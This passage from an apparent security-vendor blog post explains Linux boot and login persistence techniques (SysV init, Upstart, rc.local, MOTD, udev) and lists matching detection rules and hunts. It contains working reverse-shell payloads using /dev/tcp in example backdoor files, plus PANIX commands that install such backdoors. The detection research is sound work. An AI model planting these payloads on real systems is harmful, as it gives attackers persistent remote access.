running:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --initd --default --ip 192.168.1.1 --port 2006\n\u003e [+] init.d backdoor established with IP 192.168.1.1 and port 2006.\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"Prior to rebooting and actually establishing persistence, we can see the following documents being generated in Discover:\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image14.png\",alt:\"Events generated as a result of System V init persistence establishment\",title:\"Events generated as a result of System V init persistence establishment\",width:\"1778\",height:\"619\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"After executing PANIX, it generates a SysV init script named \",(0,t.jsx)(e.code,{children:\"/etc/init.d/ssh-procps\"}),\", applies executable permissions using \",(0,t.jsx)(e.code,{children:\"chmod +x\"}),\", and utilizes \",(0,t.jsx)(e.code,{children:\"update-rc.d\"}),\". This command triggers \",(0,t.jsx)(e.code,{children:\"systemctl daemon-reload\"}),\", which, in turn, activates the \",(0,t.jsx)(e.code,{children:\"systemd-sysv-generator\"}),\" to enable \",(0,t.jsx)(e.code,{children:\"ssh-procps\"}),\" during system boot.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Let\\u2019s reboot the system and look at the events that are generated on shutdown/boot.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image8.png\",alt:\"Events generated as a result of System V init persistence establishment\",title:\"Events generated as a result of System V init persistence establishment\",width:\"1538\",height:\"309\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"As the SysV init system is loaded early, the start command is not logged. Since it is impossible to detect an event before events are being ingested, we need to be creative in detecting this technique. Elastic will capture \",(0,t.jsx)(e.code,{children:\"already_running\"}),\" event actions for service initialization events. Through this chain we are capable of detecting the execution of the service, followed by the reverse shell that was initiated. We have several detection opportunities for this persistence technique.\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_init_d_file_creation.toml\",rel:\"nofollow\",children:\"System V Init Script Created\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml\",rel:\"nofollow\",children:\"Suspicious File Creation in /etc for Persistence\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_executed_binary_from_unusual_location.toml\",rel:\"nofollow\",children:\"System V Init (init.d) Executed Binary from Unusual Location\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml\",rel:\"nofollow\",children:\"Executable Bit Set for Potential Persistence Script\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Network\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_egress_network_connection.toml\",rel:\"nofollow\",children:\"System V Init (init.d) Egress Network Connection\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h4,{id:\"hunting-for-t1037---system-v-init\",children:\"Hunting for T1037 - System V init\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This blog will solely list the available hunts for each persistence mechanism; however, more details regarding this topic are outlined at the end of the first section in \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"the previous article on persistence\"}),\". Additionally, descriptions and references can be found in our \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules\",rel:\"nofollow\",children:\"Detection Rules repository\"}),\", specifically in the \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/tree/main/hunting\",rel:\"nofollow\",children:\"Linux hunting subdirectory\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"We can hunt for System V Init persistence through \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html\",rel:\"nofollow\",children:\"ES|QL\"}),\" and \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/kibana/current/osquery.html\",rel:\"nofollow\",children:\"OSQuery\"}),\", focusing on unusual process executions and file creations. The \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_sysv_init.toml\",rel:\"nofollow\",children:\"Persistence via System V Init\"}),\" rule contains several ES|QL and OSQuery queries that can help hunt for these types of persistence.\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"t1037---boot-or-logon-initialization-scripts-upstart\",children:\"T1037 - boot or logon initialization scripts: Upstart\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/7/upstart\",rel:\"nofollow\",children:\"Upstart\"}),\" was introduced as an alternative init system designed to improve boot performance and manage system services more dynamically than traditional SysV init. While it has been largely supplanted by systemd in many Linux distributions, Upstart is still used in some older releases and legacy systems.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The core of Upstart's configuration resides in the \",(0,t.jsx)(e.code,{children:\"/etc/init/\"}),\" directory, where job configuration files define how services are started, stopped, and managed. Each job file specifies dependencies, start conditions, and actions to be taken upon start, stop, and other events.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"In Upstart, run levels are replaced with events and tasks, which define the sequence and conditions under which jobs are executed. Upstart introduces a more event-driven model, allowing services to start based on various system events rather than predefined run levels.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Upstart can run system-wide or in user-session mode. While system-wide configurations are placed in the \",(0,t.jsx)(e.code,{children:\"/etc/init/\"}),\" directory, user-session mode configurations are located in:\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"~/.config/upstart/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"~/.init/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"/etc/xdg/upstart/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"/usr/share/upstart/sessions/\"})}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:\"An example of an Upstart job file can look like this:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`description \"Malicious Upstart Job\"\nauthor \"Ruben Groenewoud\"\n\nstart on runlevel [2345]\nstop on shutdown\n\nexec nohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The \",(0,t.jsx)(e.code,{children:\"malicious-upstart-job.conf\"}),\" file defines a job that starts on run levels 2, 3, 4, and 5 (general Linux access and networking), and stops on run levels 0, 1, and 6 (shutdown/reboot). The \",(0,t.jsx)(e.code,{children:\"exec\"}),\" line executes the malicious payload to establish a reverse shell connection when the system boots up.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"To enable the Upstart job and ensure it runs on boot, the job file must be placed in \",(0,t.jsx)(e.code,{children:\"/etc/init/\"}),\" and given appropriate permissions. Upstart jobs are automatically recognized and managed by the \",(0,t.jsx)(e.code,{children:\"Upstart init daemon\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Upstart was deprecated a long time ago, with Linux distributions such as Debian 7 and Ubuntu 16.04 being the final systems that leverage Upstart by default. These systems moved to the SysV init system, removing compatibility with Upstart altogether. Based on the data in our \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/support/matrix\",rel:\"nofollow\",children:\"support matrix\"}),\", only the Elastic Agent in Beta version supports some of these old operating systems, and the recent version of Elastic Defend does not run on them at all. These systems have been EOL for years and should not be used in production environments anymore.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Because of this reason, we added support/coverage for this technique to the \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"}),\" detection rule. If you are still running these systems in production, using, for example, old versions of \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/beats/auditbeat\",rel:\"nofollow\",children:\"Auditbeat\"}),\" to gather its logs, you can set up \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/beats/auditbeat/current/configuration-auditbeat.html\",rel:\"nofollow\",children:\"Auditbeat file creation\"}),\" and \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/docs/current/integrations/fim\",rel:\"nofollow\",children:\"FIM\"}),\" file modification rules in the \",(0,t.jsx)(e.code,{children:\"/etc/init/\"}),\" directory, similar to the techniques mentioned in the \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"previous blog\"}),\", and in the sections yet to come. Similarly to System V Init, information and real-world examples related to this technique are specified by MITRE in \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1037/\",rel:\"nofollow\",children:\"T1037\"}),\".\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1037004---boot-or-logon-initialization-scripts-run-control-rc-scripts\",children:\"T1037.004 - boot or logon initialization scripts: run control (RC) scripts\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The \",(0,t.jsx)(e.a,{href:\"https://man.freebsd.org/cgi/man.cgi?rc.local\",rel:\"nofollow\",children:\"rc.local\"}),\" script is a traditional method for executing commands or scripts on Unix-like operating systems during system boot. It is located at \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" and is typically used to start services, configure networking, or perform other system initialization tasks that do not warrant a full init script. In Darwin-based systems and very few other Unix-like systems, \",(0,t.jsx)(e.code,{children:\"/etc/rc.common\"}),\" is used for the same purpose.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Newer versions of Linux distributions have phased out the \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" file in favor of Systemd for handling initialization scripts. Systemd provides compatibility through the \",(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man8/systemd-rc-local-generator.8.html\",rel:\"nofollow\",children:\"systemd-rc-local-generator\"}),\" generator; this executable ensures backward compatibility by checking if \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" exists and is executable. If it meets these criteria, it integrates the \",(0,t.jsx)(e.code,{children:\"rc-local.service\"}),\" unit into the boot process. Therefore, as long as this generator is included in the Systemd setup, \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" scripts will execute during system boot. In RHEL derivatives, \",(0,t.jsx)(e.code,{children:\"/etc/rc.d/rc.local\"}),\" must be granted execution permissions for this technique to work.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The \",(0,t.jsx)(e.code,{children:\"rc.local\"}),\" script is a shell script that contains commands or scripts to be executed once at the end of the system boot process, after all other system services have been started. This makes it useful for tasks that require specific system conditions to be met before execution. Here\\u2019s an example of how a simple backdoored \",(0,t.jsx)(e.code,{children:\"rc.local\"}),\" script might look:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`#!/bin/sh\n/bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\nexit 0\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"The command above creates a reverse shell by opening a bash session that redirects input and output to a specified IP address and port, allowing remote access to the system.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"To ensure \",(0,t.jsx)(e.code,{children:\"rc.local\"}),\" runs during boot, the script must be marked executable. On the next boot, the \",(0,t.jsx)(e.code,{children:\"systemd-rc-local-generator\"}),\" will create the necessary symlink in order to enable the \",(0,t.jsx)(e.code,{children:\"rc-local.service\"}),\" and execute the \",(0,t.jsx)(e.code,{children:\"rc.local\"}),\" script. RC scripts did receive their own sub-technique by MITRE. More information and examples of real-world usage of RC Scripts for persistence can be found in \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1037/004/\",rel:\"nofollow\",children:\"T1037.004\"}),\".\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"persistence-through-t1037004---run-control-rc-scripts\",children:\"Persistence through T1037.004 - run control (RC) scripts\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"As long as the \",(0,t.jsx)(e.code,{children:\"systemd-rc-local-generator\"}),\" is present, establishing persistence through this technique is simple. Create the \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" file, add your payload, and mark it as executable. We will leverage the following PANIX command to establish it for us.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --rc-local --default --ip 192.168.1.1 --port 2007\n\u003e [+] rc.local backdoor established \n`})}),`\n`,(0,t.jsx)(e.p,{children:\"After rebooting the system, we can see the following events being generated:\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image6.png\",alt:\"Events generated as a result of RC Script persistence establishment\",title:\"Events generated as a result of RC Script persistence establishment\",width:\"1780\",height:\"332\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The same issue as before arises. We see the execution of PANIX, creating the \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" file and granting it execution permissions. When running \",(0,t.jsx)(e.code,{children:\"systemctl daemon-reload\"}),\", we can see the \",(0,t.jsx)(e.code,{children:\"systemd-rc-local-generator\"}),\" creating a symlink in the \",(0,t.jsx)(e.code,{children:\"/run/systemd/generator[.early|late]\"}),\" directories.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Similar to the previous example in which we ran into this issue, we can again use the \",(0,t.jsx)(e.code,{children:\"already_running\"}),\" \",(0,t.jsx)(e.code,{children:\"event.action\"}),\" documents to get some information on the executions. Digging into this, one method that detects potential traces of \",(0,t.jsx)(e.code,{children:\"rc.local\"}),\" execution is to search for documents containing \",(0,t.jsx)(e.code,{children:\"/etc/rc.local start\"}),\" entries:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image7.png\",alt:\"Events generated as a result of rc.local service status\",title:\"Events generated as a result of rc.local service status\",width:\"1999\",height:\"190\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Where we see \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" being started, after which a suspicious command is executed. The \",(0,t.jsx)(e.code,{children:\"/opt/bds_elf\"}),\" is a rootkit, leveraging \",(0,t.jsx)(e.code,{children:\"rc.local\"}),\" as a persistence method.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Additionally, we can leverage the \",(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man3/syslog.3.html\",rel:\"nofollow\",children:\"syslog\"}),\" data source, as this file is parsed on initialization of the system integration. You can set up \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/beats/filebeat\",rel:\"nofollow\",children:\"Filebeat\"}),\" or the \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/elastic-agent\",rel:\"nofollow\",children:\"Elastic Agent\"}),\" with the \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/docs/current/en/integrations/system\",rel:\"nofollow\",children:\"System integration\"}),\" to harvest syslog. When looking at potential errors in its execution logs, we can detect other traces of \",(0,t.jsx)(e.code,{children:\"rc.local\"}),\" execution events for both our testing and rootkit executions:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image4.png\",alt:\"Events generated as a result of /etc/rc.local syslog error messages\",title:\"Events generated as a result of /etc/rc.local syslog error messages\",width:\"1623\",height:\"493\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Because of the challenges in detecting these persistence mechanisms, it is very important to catch traces as early in the chain as possible. Leveraging a multi-layered defense strategy increases the chances of detecting techniques like these.\"}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_script_creation.toml\",rel:\"nofollow\",children:\"rc.local/rc.common File Creation\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_service_already_running.toml\",rel:\"nofollow\",children:\"Potential Execution of rc.local Script\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml\",rel:\"nofollow\",children:\"Executable Bit Set for Potential Persistence Script\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Syslog\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_error_via_syslog.toml\",rel:\"nofollow\",children:\"Suspicious rc.local Error Message\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"hunting-for-t1037004---run-control-rc-scripts\",children:\"Hunting for T1037.004 - run control (RC) scripts\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Similar to the System V Init detection opportunity limitations, this technique deals with the same limitations due to timing. Thus, hunting for RC Script persistence is important. We can hunt for this technique by looking at \",(0,t.jsx)(e.code,{children:\"/etc/rc.local\"}),\" file creations and/or modifications and the existence of the \",(0,t.jsx)(e.code,{children:\"rc-local.service\"}),\" systemd unit/startup item. The \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_rc_local.toml\",rel:\"nofollow\",children:\"Persistence via rc.local/rc.common\"}),\" rule contains several ES|QL and OSQuery queries that aid in hunting for this technique.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1037---boot-or-logon-initialization-scripts-message-of-the-day-motd\",children:\"T1037 - boot or logon initialization scripts: Message of the Day (MOTD)\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/5/motd\",rel:\"nofollow\",children:\"Message of the Day (MOTD)\"}),\" is a feature that displays a message to users when they log in via SSH or a local terminal. To display messages before and after the login process, Linux uses the \",(0,t.jsx)(e.code,{children:\"/etc/issue\"}),\" and the \",(0,t.jsx)(e.code,{children:\"/etc/motd\"}),\" files. These messages display on the command line and will not be seen before and after a graphical login. The \",(0,t.jsx)(e.code,{children:\"/etc/issue\"}),\" file is typically used to display a login message or banner, while the \",(0,t.jsx)(e.code,{children:\"/etc/motd\"}),\" file generally displays issues, security policies, or messages. These messages are global and will display to all users at the command line prompt. Only a privileged user (such as root) can edit these files.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"In addition to the static \",(0,t.jsx)(e.code,{children:\"/etc/motd\"}),\" file, modern systems often use dynamic MOTD scripts stored in \",(0,t.jsx)(e.code,{children:\"/etc/update-motd.d/\"}),\". These scripts generate dynamic content that can be included in the MOTD, such as current system metrics, weather updates, or news headlines.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"These dynamic scripts are shell scripts that execute shell commands. It is possible to create a new file within this directory or to add a backdoor to an existing one. Once the script has been granted execution permissions, it will execute every time a user logs in.\"}),`\n`,(0,t.jsx)(e.p,{children:\"RHEL derivatives do not make use of dynamic MOTD scripts in a similar way as Debian does, and are not susceptible to this technique.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"An example of a backdoored \",(0,t.jsx)(e.code,{children:\"/etc/update-motd.d/\"}),\" file could look like this:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`#!/bin/sh\nnohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261'\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Like before, MITRE does not have a specific technique related to this. Therefore we classify this technique as \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1037/\",rel:\"nofollow\",children:\"T1037\"}),\".\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"persistence-through-t1037---message-of-the-day-motd\",children:\"Persistence through T1037 - message of the day (MOTD)\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"A \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1644-L1669\",rel:\"nofollow\",children:\"payload\"}),\" similar to the one presented above should be used to ensure the backdoor does not interrupt the SSH login, potentially triggering the user\\u2019s attention. We can leverage PANIX to set up persistence on Debian-based systems through MOTD like so:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:` \u003e sudo ./panix.sh --motd --default --ip 192.168.1.1 --port 2008\n\u003e [+] MOTD backdoor established in /etc/update-motd.d/137-python-upgrades\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"To trigger the backdoor, we can reconnect to the server via SSH or reconnect to the terminal.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image2.png\",alt:\"Events generated as a result of Message of the Day (MOTD) persistence establishment\",title:\"Events generated as a result of Message of the Day (MOTD) persistence establishment\",width:\"1859\",height:\"816\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In the image above we can see PANIX being executed, which creates the \",(0,t.jsx)(e.code,{children:\"/etc/update-motd.d/137-python-upgrades\"}),\" file and marks it as executable. Next, when a user connects to SSH/console, the payload is executed, resulting in an egress network connection by the root user. This is a straightforward attack chain, and we have several layers of detections for this:\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_message_of_the_day_creation.tom\",rel:\"nofollow\",children:\"Message-of-the-Day (MOTD) File Creation\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_process_spawned_from_motd_detected.toml\",rel:\"nofollow\",children:\"Process Spawned from Message-of-the-Day (MOTD)\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_message_of_the_day_execution.toml\",rel:\"nofollow\",children:\"Suspicious Message Of The Day Execution\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml\",rel:\"nofollow\",children:\"Executable Bit Set for Potential Persistence Script\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Network\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_motd_execution_followed_by_egress_network_connection.toml\",rel:\"nofollow\",children:\"MOTD Execution Followed by Egress Network Connection\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_network_connection_by_motd_child.toml\",rel:\"nofollow\",children:\"Egress Network Connection by MOTD Child\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"hunting-for-t1037---message-of-the-day-motd\",children:\"Hunting for T1037 - message of the day (MOTD)\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Hunting for MOTD persistence can be conducted through ES|QL and OSQuery. We can do so by analyzing file creations in these directories and executions from MOTD parent processes. We created the \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_message_of_the_day.toml\",rel:\"nofollow\",children:\"Persistence via Message-of-the-Day\"}),\" rule aid in this endeavor.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1546---event-triggered-execution-udev\",children:\"T1546 - event triggered execution: udev\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man7/udev.7.html\",rel:\"nofollow\",children:\"Udev\"}),\" is the device manager for the Linux kernel, responsible for managing device nodes in the \",(0,t.jsx)(e.code,{children:\"/dev\"}),\" directory. It dynamically creates or removes device nodes, manages permissions, and handles various events triggered by device state changes. Essentially, Udev acts as an intermediary between the kernel and user space, ensuring that the operating system appropriately handles hardware changes.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"When a new device is added to the system (such as a USB drive, keyboard, or network interface), Udev detects this event and applies predefined rules to manage the device. Each rule consists of key-value pairs that match device attributes and actions to be performed. Udev rules files are processed in lexical order, and rules can match various device attributes, including device type, kernel name, and more. Udev rules are defined in text files within a default set of directories:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"/etc/udev/rules.d/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"/run/udev/rules.d/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"/usr/lib/udev/rules.d/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"/usr/local/lib/udev/rules.d/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.code,{children:\"/lib/udev/\"})}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Priority is measured based on the source directory of the rule file and takes precedence based on the order listed above (\",(0,t.jsx)(e.code,{children:\"/etc/\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"/run/\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"/usr/\"}),\"). When a rule matches, it can trigger a wide range of actions, including executing arbitrary commands or scripts. This flexibility makes Udev a potential vector for persistence by malicious actors. An example Udev rule looks like the following:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`SUBSYSTEM==\"block\", ACTION==\"add|change\", ENV{DM_NAME}==\"ubuntu--vg-ubuntu--lv\", SYMLINK+=\"disk/by-dname/ubuntu--vg-ubuntu--lv\"\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"To leverage this method for persistence, root privileges are required. Once a rule file is created, the rules need to be reloaded.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sudo udevadm control --reload-rules\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"To test the rule, either perform the action specified in the rule file 